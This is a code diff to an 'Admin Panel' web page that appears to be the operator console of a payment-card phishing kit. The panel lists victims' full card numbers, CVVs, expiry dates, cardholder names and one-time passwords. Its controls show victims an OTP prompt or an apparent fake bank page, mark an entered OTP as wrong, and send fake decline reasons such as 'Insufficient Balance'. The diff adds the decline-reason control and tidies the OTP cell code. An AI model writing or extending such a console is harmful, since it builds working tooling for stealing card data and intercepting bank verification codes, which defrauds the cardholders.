@@ -24,7 +24,8 @@
     button:disabled { background: #666; cursor: not-allowed; }
     .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
     .status-processing { background: #f59e0b; color: #000; }
-    .status-otp { background: #3b82f6; color: #fff; }
+    .status-otp_pending { background: #3b82f6; color: #fff; }
+    .status-otp_received { background: #8b5cf6; color: #fff; }
     .status-success { background: #22c55e; color: #fff; }
     .status-fail { background: #ef4444; color: #fff; }
     .otp-received { background-color: #10B981; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
@@ -39,7 +40,7 @@
 <body>
   <div class="container">
     <h1>Admin Panel</h1>
-    
+
     <div class="generate-link">
       <h2>Generate Payment Link</h2>
       <form id="generateLinkForm">
@@ -59,7 +60,7 @@
         <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
       </div>
     </div>
-    
+
     <h2>Transactions</h2>
     <table id="transactionsTable">
       <thead>
@@ -126,35 +127,34 @@
         const data = await response.json();
         const tbody = document.querySelector("#transactionsTable tbody");
         tbody.innerHTML = '';
-        
+
         data.forEach(tx => {
           const row = document.createElement('tr');
           row.innerHTML = `
             <td>${tx.id}</td>
             <td>${tx.email}</td>
             <td>${tx.amount}</td>
-            <td>${tx.currency}</td>
+            <td>${tx.currency || 'INR'}</td>
             <td>${tx.cardNumber}</td>
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
-            // admin.html - Update the OTP cell in the transaction row
-<td>
-  ${txn.otpEntered ? 
-    `<span class="otp-received">${txn.otpEntered}</span>
-     <button class="wrong-otp-btn" onclick="markWrongOTP('${txn.id}')" ${txn.redirectStatus ? 'disabled' : ''}>
-       Incorrect OTP
-     </button>` : 
-    (txn.otpShown ?
-      '<span class="status-badge status-otp">Waiting for OTP</span>' :
-      `<button class="show-otp-btn" onclick="showOTP('${txn.id}')" ${txn.status !== 'processing' ? 'disabled' : ''}>
-        Show OTP
-      </button>`)
-  }
-  <button class="bank-page-btn" onclick="toggleBankpage('${txn.id}')" ${txn.status !== 'processing' ? 'disabled' : ''}>
-    ${txn.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}
-  </button>
-</td>
+            <td>
+              ${tx.otpEntered ?
+                `<span class="otp-received">${tx.otpEntered}</span>
+                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
+                   Incorrect OTP
+                 </button>` :
+                (tx.otpShown ?
+                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
+                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    Show OTP
+                  </button>`)
+              }
+              <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}
+              </button>
+            </td>
             <td>
               <span class="status-badge status-${tx.status || 'processing'}">
                 ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
@@ -165,13 +165,19 @@
                 <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
                   Success
                 </button>
-                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>
-                  Fail
-                </button>
+                <div class="mt-2">
+                  <select id="reason-${tx.id}" class="bg-gray-800 text-white text-xs p-1 border border-gray-600 rounded">
+                    <option value="insufficient_balance">Insufficient Balance</option>
+                    <option value="bank_declined">Bank Declined</option>
+                    <option value="card_disabled">Card Disabled</option>
+                    <option value="invalid_card">Invalid Card</option>
+                  </select>
+                  <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
+                    class="bg-red-500 hover:bg-red-600">
+                    Fail
+                  </button>
+                </div>
               ` : ''}
-              <button onclick="toggleBankpage('${tx.id}')" class="bank-page-btn">  
-                ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}  
-              </button>  
             </td>
           `;
           tbody.appendChild(row);
@@ -195,6 +201,23 @@
       } catch (error) {
         console.error('Error updating status:', error);
         alert('Failed to update status');
+      }
+    }
+
+    async function updateStatusWithReason(id, status) {
+      const reasonSelect = document.getElementById(`reason-${id}`);
+      const failureReason = reasonSelect.value;
+      try {
+        const response = await fetch("/api/updateRedirectStatus", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id, redirectStatus: status, failureReason })
+        });
+        if (!response.ok) throw new Error('Failed to update status with reason');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error updating status with reason:', error);
+        alert('Failed to update status with reason');
       }
     }
 
@@ -229,8 +252,8 @@
     }
 
     async function toggleBankpage(id) {
-      const txn = transactionsMap.get(id);
-      if (txn.bankpageVisible) {
+      const tx = transactionsMap.get(id);
+      if (tx.bankpageVisible) {
         await hideBankPage(id);
       } else {
         await showBankpage(id);
